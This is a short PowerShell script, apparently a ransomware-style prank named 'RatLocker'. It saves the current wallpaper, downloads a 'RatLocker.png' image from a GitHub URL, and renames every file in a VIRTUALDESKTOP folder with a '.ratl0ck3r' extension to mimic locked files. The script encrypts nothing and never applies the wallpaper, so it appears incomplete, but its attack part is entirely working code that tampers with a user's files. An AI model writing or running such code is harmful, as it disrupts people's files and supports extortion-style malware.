Copy-Item "$HOME\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" -Destination C:\Users\marha\AppData\Local\Temp\YourOldWallpaper.png
Invoke-WebRequest https://raw.githubusercontent.com/WalkTheEarth/ratlocker/main/RatLocker.png -OutFile C:\Users\marha\AppData\Local\Temp\RatLocker.png
$MyWallpaper="C:\Users\marha\AppData\Local\Temp\RatLocker.png"
dir $HOME\VIRTUALDESKTOP | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
